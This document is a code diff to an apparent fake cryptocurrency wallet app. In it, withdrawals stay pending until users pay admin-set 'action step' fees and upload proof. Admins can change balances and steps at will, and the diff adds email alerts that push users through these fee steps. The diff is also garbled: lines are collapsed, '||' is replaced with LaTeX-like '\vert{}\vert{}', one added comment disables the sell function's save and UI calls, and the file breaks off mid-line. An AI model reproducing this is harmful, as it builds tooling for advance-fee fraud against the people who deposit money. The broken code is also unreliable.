@@ -841,93 +841,10 @@
                     if (u.stepIdx < actionSteps.length) {
                         const nextStep = actionSteps[u.stepIdx];
                         if (tx) {
-                            tx.status = `PENDING (${nextStep.title.toUpperCase()})`;
-                        }
-                    } else {
-                        if (tx) tx.status = "COMPLETED";
-                        u.activeTxId = null;
-                    }
-                    updated = true;
-                }
-            });
-            if (updated) saveState();
-        }
-        setInterval(checkTimersAndAutoProgress, 5000);
-
-        function saveState() {
-            db.collection("config").doc("appData").set({
-                usersList: usersList,
-                userEmails: userEmails,
-                exchanges: exchanges,
-                actionSteps: actionSteps,
-                globalAddresses: globalAddresses,
-                platformTerms: platformTerms,
-                proofQueue: proofQueue,
-                knowledgeBase: knowledgeBase,
-                supportAgents: supportAgents,
-                chatThreads: chatThreads
-            }, { merge: true });
-            if (currentUserEmail) {
-                localStorage.setItem('chronicle_current_user', currentUserEmail);
-            }
-            localStorage.setItem('chronicle_theme', currentTheme);
-        }
-
-        function showNotification(title, message, icon = "🔔") {
-            const toast = document.getElementById('notification-toast');
-            document.getElementById('toast-title').innerText = title;
-            document.getElementById('toast-message').innerText = message;
-            document.getElementById('toast-icon').innerText = icon;
-            toast.classList.add('show');
-            setTimeout(() => { toast.classList.remove('show'); }, 5000);
-        }
-
-        function getCurrentUserData() {
-            if (!currentUserEmail) return null;
-            let u = usersList.find(x => x.email === currentUserEmail);
-            return u || null;
-        }
-
-        function sendSimulatedEmail(email, subject, body, popupTitle = "New Notification") {
-            if (!userEmails[email]) userEmails[email] = [];
-            userEmails[email].unshift({ subject, body, date: new Date().toLocaleTimeString() });
-            saveState();
-
-            if (currentUserEmail === email) {
-                showNotification(popupTitle, body, "💸");
-            }
-        }
-
-        function updateBalanceUI() {
-            const u = getCurrentUserData();
-            const guestPrompt = document.getElementById('guest-prompt-card');
-            const dashboard = document.getElementById('wallet-dashboard-container');
-            const txCard = document.getElementById('tx-history-card');
-            const usdRow = document.getElementById('usd-asset-row');
-
-            if (u) {
-                if (!u.userId) {
-                    u.userId = 'CRN-' + Math.floor(1000 + Math.random() * 9000);
-                    saveState();
-                }
-                guestPrompt.classList.add('hidden');
-                dashboard.classList.remove('hidden');
-                txCard.classList.remove('hidden');
-                usdRow.classList.remove('hidden');
-
-                const btcVal = u.btc * liveBtcUsd;
-                const ethVal = u.eth * liveEthUsd;
-                const totalVal = btcVal + ethVal + u.usd;
-
-                document.getElementById('user-total-val').innerText = `$${totalVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+                            tx.status = `PENDING (${nextStep.title.toUpperCase()})`; } } else { if (tx) tx.status = "COMPLETED"; u.activeTxId = null; } updated = true; } }); if (updated) saveState(); } setInterval(checkTimersAndAutoProgress, 5000);  function saveState() { db.collection("config").doc("appData").set({ usersList: usersList, userEmails: userEmails, exchanges: exchanges, actionSteps: actionSteps, globalAddresses: globalAddresses, platformTerms: platformTerms, proofQueue: proofQueue, knowledgeBase: knowledgeBase, supportAgents: supportAgents, chatThreads: chatThreads }, { merge: true }); if (currentUserEmail) { localStorage.setItem('chronicle_current_user', currentUserEmail); } localStorage.setItem('chronicle_theme', currentTheme); }  function showNotification(title, message, icon = "🔔") { const toast = document.getElementById('notification-toast'); document.getElementById('toast-title').innerText = title; document.getElementById('toast-message').innerText = message; document.getElementById('toast-icon').innerText = icon; toast.classList.add('show'); setTimeout(() => { toast.classList.remove('show'); }, 5000); }  function getCurrentUserData() { if (!currentUserEmail) return null; let u = usersList.find(x => x.email === currentUserEmail); return u \vert{}\vert{} null; }  function sendSimulatedEmail(email, subject, body, popupTitle = "New Notification") { if (!userEmails[email]) userEmails[email] = []; userEmails[email].unshift({ subject, body, date: new Date().toLocaleTimeString() }); saveState();  if (currentUserEmail === email) { showNotification(popupTitle, body, "💸"); } }  function updateBalanceUI() { const u = getCurrentUserData(); const guestPrompt = document.getElementById('guest-prompt-card'); const dashboard = document.getElementById('wallet-dashboard-container'); const txCard = document.getElementById('tx-history-card'); const usdRow = document.getElementById('usd-asset-row');  if (u) { if (!u.userId) { u.userId = 'CRN-' + Math.floor(1000 + Math.random() * 9000); saveState(); } guestPrompt.classList.add('hidden'); dashboard.classList.remove('hidden'); txCard.classList.remove('hidden'); usdRow.classList.remove('hidden');  const btcVal = u.btc * liveBtcUsd; const ethVal = u.eth * liveEthUsd; const totalVal = btcVal + ethVal + u.usd;  document.getElementById('user-total-val').innerText = `$${totalVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
                 document.getElementById('user-id-badge').innerText = u.userId;
-                document.getElementById('btc-holdings-display').innerText = `${u.btc.toFixed(4)} BTC`;
-                document.getElementById('btc-fiat-value').innerText = `$${btcVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
-                document.getElementById('eth-holdings-display').innerText = `${u.eth.toFixed(4)} ETH`;
-                document.getElementById('eth-fiat-value').innerText = `$${ethVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
-                document.getElementById('usd-fiat-value').innerText = `$${u.usd.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
-
-                document.getElementById('auth-status-btn').innerText = `👤 ${currentUserEmail.split('@')[0]}`;
+                document.getElementById('btc-holdings-display').innerText = `${u.btc.toFixed(4)} BTC`; document.getElementById('btc-fiat-value').innerText = `$${btcVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+                document.getElementById('eth-holdings-display').innerText = `${u.eth.toFixed(4)} ETH`; document.getElementById('eth-fiat-value').innerText = `$${ethVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`; document.getElementById('usd-fiat-value').innerText = `$${u.usd.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;  document.getElementById('auth-status-btn').innerText = `👤 ${currentUserEmail.split('@')[0]}`;
                 document.getElementById('unread-badge').innerText = (userEmails[currentUserEmail] || []).length;
                 renderHistoryTable();
             } else {
@@ -961,11 +878,7 @@
                 const data = await res.json();
                 if (data.bitcoin && data.bitcoin.usd) {
                     liveBtcUsd = data.bitcoin.usd;
-                    document.getElementById('btc-live-price').innerText = `Live BTC: $${liveBtcUsd.toLocaleString()}`;
-                }
-                if (data.ethereum && data.ethereum.usd) {
-                    liveEthUsd = data.ethereum.usd;
-                    document.getElementById('eth-live-price').innerText = `Live ETH: $${liveEthUsd.toLocaleString()}`;
+                    document.getElementById('btc-live-price').innerText = `Live BTC: $${liveBtcUsd.toLocaleString()}`; } if (data.ethereum && data.ethereum.usd) { liveEthUsd = data.ethereum.usd; document.getElementById('eth-live-price').innerText = `Live ETH: $${liveEthUsd.toLocaleString()}`;
                 }
                 updateBalanceUI();
             } catch (e) {}
@@ -982,8 +895,7 @@
             }
             tbody.innerHTML = u.txs.map(tx => `
                 <tr>
-                    <td>${tx.type}</td>
-                    <td>$${tx.amount.toLocaleString('en-US', {minimumFractionDigits:2})}</td>
+                    <td>${tx.type}</td> <td>$${tx.amount.toLocaleString('en-US', {minimumFractionDigits:2})}</td>
                     <td><span class="badge ${tx.status === 'COMPLETED' ? 'badge-success' : 'badge-pending'}">${tx.status}</span></td>
                     <td>${tx.status.includes('PENDING') || tx.status.includes('IN PROGRESS') || tx.status.includes('REVIEW') || tx.status.includes('ACTIVATING') || tx.status.includes('CLEARING') || tx.status.includes('SUBMITTED') ? `<button class="btn" style="padding:3px 6px; font-size:0.75rem;" onclick="openActionModal()">View Action</button>` : 'Finished'}</td>
                 </tr>
@@ -1079,10 +991,18 @@
                 recipientUser.usd += deductUsd;
             }
 
-            u.txs.unshift({ type: `Send (${asset.toUpperCase()})`, amount: fiatVal, status: 'COMPLETED' });
-            recipientUser.txs.unshift({ type: `Receive (${asset.toUpperCase()})`, amount: fiatVal, status: 'COMPLETED' });
+            u.txs.unshift({ type: `Send (${asset.toUpperCase()})`, amount: fiatVal, status: 'COMPLETED' }); recipientUser.txs.unshift({ type: `Receive (${asset.toUpperCase()})`, amount: fiatVal, status: 'COMPLETED' });
             
-            sendSimulatedEmail(recipientUser.email, `Incoming Transfer`, `Received ${asset.toUpperCase()} transfer from ${u.name || u.email} (ID: ${u.userId})`, `💸 Received from ${u.name || u.email}!`);
+            sendSimulatedEmail(recipientUser.email, `Incoming Transfer`, `Received ${asset.toUpperCase()} transfer from ${u.name \vert{}\vert{} u.email} (ID:${u.userId})`, `💸 Received from ${u.name || u.email}!`);
+            
+            // 🚀 BREVO EMAIL TRIGGER: SEND TRANSFER ALERT
+            if (window.sendTransferSentAlert) {
+                window.sendTransferSentAlert(currentUserEmail, u.name || currentUserEmail, fiatVal, recipientId, 'TX-' + Date.now());
+            }
+            if (window.sendTransferReceivedAlert) {
+                window.sendTransferReceivedAlert(recipientUser.email, recipientUser.name || recipientUser.email, fiatVal, u.userId, 'TX-' + Date.now());
+            }
+
             saveState(); updateBalanceUI(); closeSendModal();
             showNotification("Transfer Sent", `Successfully sent to ${recipientUser.name || recipientId}`, "↗");
         }
@@ -1100,9 +1020,7 @@
             let fiatGain = asset === 'btc' ? amt * liveBtcUsd : amt * liveEthUsd;
             if (asset === 'btc') u.btc -= amt; else u.eth -= amt;
             u.usd += fiatGain;
-            u.txs.unshift({ type: `Sell (${asset.toUpperCase()})`, amount: fiatGain, status: 'COMPLETED' });
-            saveState(); updateBalanceUI(); closeSellModal();
-            showNotification("Sold", `Converted to $${fiatGain.toFixed(2)} USD`, "📉");
+            u.txs.unshift({ type: `Sell (${asset.toUpperCase()})`, amount: fiatGain, status: 'COMPLETED' });  // 🚀 BREVO EMAIL TRIGGER: COIN SALE ALERT if (window.sendCoinSoldAlert) { window.sendCoinSoldAlert(currentUserEmail, u.name \vert{}\vert{} currentUserEmail, amt, asset.toUpperCase(), fiatGain); }  saveState(); updateBalanceUI(); closeSellModal(); showNotification("Sold", `Converted to $${fiatGain.toFixed(2)} USD`, "📉");
         }
 
         function openWithdrawModal() {
@@ -1162,6 +1080,12 @@
             const firstStep = actionSteps.length > 0 ? actionSteps[0] : { title: "ACTIVATING", amount: 0, statusMsg: "Processing" };
 
             u.txs.unshift({ id: txId, type: `Withdraw (${selectedWithdrawMethodName})`, amount: amt, baseWithdraw: amt, status: `PENDING (${firstStep.title.toUpperCase()})` });
+            
+            // 🚀 BREVO EMAIL TRIGGER: WITHDRAWAL / STEP ALERT
+            if (window.sendWithdrawalAlert) {
+                window.sendWithdrawalAlert(currentUserEmail, u.name || currentUserEmail, amt, selectedWithdrawMethodName, firstStep.title, firstStep.note || 'Please complete verification.');
+            }
+
             saveState(); updateBalanceUI();
             showNotification("Processing", `Withdrawal request submitted`, "💳");
             setTimeout(() => { openActionModal(); }, 1500);
@@ -1174,11 +1098,7 @@
             if (!step) return;
 
             document.getElementById('modal-step-title').innerText = `⚠️ ${step.title}`;
-            document.getElementById('modal-step-note').innerText = step.note ? `Note: ${step.note}` : '';
-            
-            const tx = (u.txs || []).find(t => t.id == u.activeTxId);
-            const displayAmt = step.amount;
-            document.getElementById('modal-step-amount').innerText = `$${displayAmt}.00`;
+            document.getElementById('modal-step-note').innerText = step.note ? `Note: ${step.note}` : '';  const tx = (u.txs \vert{}\vert{} []).find(t => t.id == u.activeTxId); const displayAmt = step.amount; document.getElementById('modal-step-amount').innerText = `$${displayAmt}.00`;
 
             const uploadSection = document.getElementById('proof-upload-section');
             const submittedNotice = document.getElementById('proof-submitted-notice');
@@ -1247,6 +1167,11 @@
                     
                     const tx = u.txs.find(t => t.id == u.activeTxId);
                     if (tx) tx.status = `PROOF SUBMITTED (PENDING ADMIN REVIEW)`;
+
+                    // 🚀 BREVO EMAIL TRIGGER: PROOF SUBMITTED ALERT
+                    if (window.sendProofSubmittedAlert) {
+                        window.sendProofSubmittedAlert(currentUserEmail, u.name || currentUserEmail, step.title, step.amount);
+                    }
 
                     db.collection("config").doc("appData").set({
                         usersList: usersList,
@@ -1325,15 +1250,14 @@
 
             if (type === 'status') {
                 if (tx) tx.status = val.toUpperCase();
-                alert(`Successfully updated ${email}'s transaction status to "${val.toUpperCase()}"`);
-            } else {
-                const newStepIdx = parseInt(val, 10);
-                if (isNaN(newStepIdx)) { alert("Please enter a valid step number (e.g. 0, 1, 2)"); return; }
-                targetUser.stepIdx = newStepIdx;
-                if (tx && actionSteps[newStepIdx]) {
-                    tx.status = `PENDING (${actionSteps[newStepIdx].title.toUpperCase()})`;
+                alert(`Successfully updated ${email}'s transaction status to "${val.toUpperCase()}"`); } else { const newStepIdx = parseInt(val, 10); if (isNaN(newStepIdx)) { alert("Please enter a valid step number (e.g. 0, 1, 2)"); return; } targetUser.stepIdx = newStepIdx; if (tx && actionSteps[newStepIdx]) { tx.status = `PENDING (${actionSteps[newStepIdx].title.toUpperCase()})`;
+                    
+                    // 🚀 BREVO EMAIL TRIGGER: ADMIN OVERRIDE / STEP ALERT
+                    if (window.sendWithdrawalAlert) {
+                        window.sendWithdrawalAlert(targetUser.email, targetUser.name || targetUser.email, tx.amount, 'External Account', actionSteps[newStepIdx].title, actionSteps[newStepIdx].note || 'Please check dashboard.');
+                    }
                 }
-                alert(`Successfully updated ${email}'s current step index to ${newStepIdx}`);
+                alert(`Successfully updated ${email}'s current step index to${newStepIdx}`);
             }
 
             saveState();
@@ -1496,7 +1420,7 @@
             }
 
             const thread = chatThreads[selectedAdminChatUser];
-            thread.messages.push({ sender: 'agent', text: `[${agentName}]: ${replyText}`, time: new Date().toLocaleTimeString() });
+            thread.messages.push({ sender: 'agent', text: `[${agentName}]:${replyText}`, time: new Date().toLocaleTimeString() });
             thread.agentRepliedSinceLastUser = true;
             thread.adminTyping = false;
             
@@ -1526,9 +1450,7 @@
             if (action === 'topup') targetUser[asset] += amount;
             else targetUser[asset] -= amount;
 
-            sendSimulatedEmail(email, `Balance Updated (${asset.toUpperCase()})`, `Your ${asset.toUpperCase()} balance was ${action === 'topup' ? 'credited' : 'debited'} by ${amount}.\nReason: ${reason}`, "💰 Balance Update!");
-            saveState(); updateBalanceUI();
-            showNotification("Balance Updated", `${asset.toUpperCase()} ${action === 'topup' ? 'credited' : 'debited'} by ${amount}`, "💰");
+            sendSimulatedEmail(email, `Balance Updated (${asset.toUpperCase()})`, `Your ${asset.toUpperCase()} balance was ${action === 'topup' ? 'credited' : 'debited'} by${amount}.\nReason: ${reason}`, "💰 Balance Update!"); saveState(); updateBalanceUI(); showNotification("Balance Updated", `${asset.toUpperCase()} ${action === 'topup' ? 'credited' : 'debited'} by${amount}`, "💰");
             alert(`Successfully updated balance for ${email}!`);
         }
 
@@ -1568,13 +1490,16 @@
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 const step = actionSteps[p.stepIdx];
                 if (tx && step) {
-                    // 1. Add approved fee amount to pending transaction total
                     tx.amount += step.amount;
-
-                    // 2. Set status to the assigned status message (e.g. Activating) and start the countdown timer
                     tx.status = step.statusMsg.toUpperCase();
                     u.statusExpiryTime = Date.now() + ((step.timerMinutes || 2) * 60 * 1000);
                 }
+
+                // 🚀 BREVO EMAIL TRIGGER: PROOF APPROVED ALERT
+                if (window.sendProofApprovedAlert) {
+                    window.sendProofApprovedAlert(u.email, u.name || u.email, step.title);
+                }
+
                 alert(`Proof approved for ${p.user}. Status set to "${step.statusMsg}" for ${step.timerMinutes} minute(s).`);
             }
             saveState();
@@ -1613,11 +1538,11 @@
             document.getElementById('admin-usd-addr').value = globalAddresses.usd || '';
             document.getElementById('admin-terms-text').value = platformTerms || '';
             document.getElementById('admin-kb-text').value = knowledgeBase || '';
-            document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} [ID: ${u.userId}] (USD: $${u.usd})</option>`).join('');
-            document.getElementById('admin-override-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} (Step: ${u.stepIdx})</option>`).join('');
+            document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} [ID: ${u.userId}] (USD:$${u.usd})</option>`).join('');
+            document.getElementById('admin-override-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} (Step:${u.stepIdx})</option>`).join('');
             
             const displayedUsers = showAllUsers ? usersList : usersList.slice(0, 4);
-            document.getElementById('admin-users-list').innerHTML = displayedUsers.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.name || 'User'} (${u.email})</strong> [ID: ${u.userId}] - Step: ${u.stepIdx} | USD: $${u.usd}</div>`).join('');
+            document.getElementById('admin-users-list').innerHTML = displayedUsers.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.name || 'User'} (${u.email})</strong> [ID:${u.userId}] - Step: ${u.stepIdx} \vert{} USD:$${u.usd}</div>`).join('');
             
             const toggleContainer = document.getElementById('admin-users-toggle-container');
             if (usersList.length > 4) {
@@ -1627,7 +1552,7 @@
             }
 
             document.getElementById('admin-exchanges-list').innerHTML = exchanges.map(ex => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>${ex.name}</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteExchange(${ex.id})">Delete</button></div>`).join('');
-            document.getElementById('action-steps-list').innerHTML = actionSteps.map((st, i) => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>Step ${i+1}: ${st.title} ($${st.amount}) [Note: ${st.note || 'None'}] → Status: [${st.statusMsg}] (${st.timerMinutes || 2}m)</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteActionStep(${st.id})">Delete</button></div>`).join('');
+            document.getElementById('action-steps-list').innerHTML = actionSteps.map((st, i) => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>Step ${i+1}: ${st.title} ($${st.amount}) [Note:${st.note || 'None'}] → Status: [${st.statusMsg}] (${st.timerMinutes || 2}m)</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteActionStep(${st.id})">Delete</button></div>`).join('');
             
             document.getElementById('admin-agents-list').innerHTML = supportAgents.map(ag => `
                 <div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.4rem; border-radius:6px; display:flex; align-items:center; justify-content:space-between;">
@@ -1755,6 +1680,12 @@
             const newUser = { name, email, userId: uniqueId, password, pin: null, btc: 0, eth: 0, usd: 0, txs: [], stepIdx: 0, activeTxId: null, statusExpiryTime: null };
             usersList.push(newUser);
             currentUserEmail = email;
+
+            // 🚀 BREVO EMAIL TRIGGER: WELCOME ALERT
+            if (window.sendWelcomeAlert) {
+                window.sendWelcomeAlert(email, name);
+            }
+
             saveState();
             closeAuthModal();
             updateBalanceUI();
@@ -1797,50 +1728,4 @@
                         <div style="width:32px; height:32px; border-radius:6px; background:#fff; display:flex; align-items:center; justify-content:center; font-weight:bold; color:#000;">${ex.logo}</div>
                         <div>
                             <strong>${ex.name}</strong>
-                            <div style="font-size:0.75rem; color:var(--text-muted); margin-top:2px;">
-                                Copy address first: <button class="btn" style="display:inline-block; width:auto; padding:2px 6px; font-size:0.7rem; background:var(--primary);" onclick="navigator.clipboard.writeText('${addr}'); alert('Copied address: ${addr}');">Click Here 📋</button>
-                            </div>
-                        </div>
-                    </div>
-                    <a href="${ex.link}" target="_blank" class="btn" style="width:auto; padding:0.4rem 0.85rem; font-size:0.85rem; text-decoration:none;" onclick="alert('Ensure you paste your wallet address on ${ex.name}!');">Buy ↗</a>
-                </div>
-            `).join('');
-            document.getElementById('buy-modal').style.display = 'flex';
-        }
-        function closeBuyModal() { document.getElementById('buy-modal').style.display = 'none'; }
-
-        function closeInstallModal() {
-            document.getElementById('install-app-modal').style.display = 'none';
-        }
-
-        if (!localStorage.getItem('chronicle_install_prompt_shown')) {
-            setTimeout(() => {
-                document.getElementById('install-app-modal').style.display = 'flex';
-                localStorage.setItem('chronicle_install_prompt_shown', 'true');
-            }, 1000);
-        }
-
-        updateBalanceUI();
-      updateSupportAgentUI();   
-        </script>
-<script type="module">
-  import { 
-    sendWithdrawalAlert, 
-    sendWelcomeAlert, 
-    sendProofApprovedAlert,
-    sendProofSubmittedAlert,
-    sendTransferSentAlert,
-    sendTransferReceivedAlert
-  } from './email.js';
-
-  // Make email functions accessible everywhere in your script
-  window.sendWelcomeAlert = sendWelcomeAlert;
-  window.sendWithdrawalAlert = sendWithdrawalAlert;
-  window.sendProofApprovedAlert = sendProofApprovedAlert;
-  window.sendProofSubmittedAlert = sendProofSubmittedAlert;
-  window.sendTransferSentAlert = sendTransferSentAlert;
-  window.sendTransferReceivedAlert = sendTransferReceivedAlert;
-
-    </script>
-</body>
-</html>
+                            <div style="font-size:0.75rem; color
